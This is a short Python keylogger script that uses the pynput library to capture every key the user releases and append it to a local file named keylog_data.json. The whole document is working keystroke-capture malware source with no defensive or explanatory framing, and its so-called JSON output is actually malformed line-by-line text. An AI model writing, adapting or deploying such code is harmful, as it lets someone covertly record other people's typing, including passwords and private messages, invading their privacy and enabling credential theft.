import json
import os
import time
from pynput import keyboard

# Specify the path for the log file
log_file_path = "keylog_data.json"

# Initialize the data structure to store keystrokes
data = {"keystrokes": []}

def on_release(key):
    try:
        key_str = key.char
    except AttributeError:
        key_str = str(key)

    data["keystrokes"].append(key_str)

    # Save the updated data to the JSON file
    with open(log_file_path, 'a') as f:

        f.write(f"\"{key_str}\"\n")

# Start the keylogger
with keyboard.Listener(on_release=on_release) as listener:
    listener.join()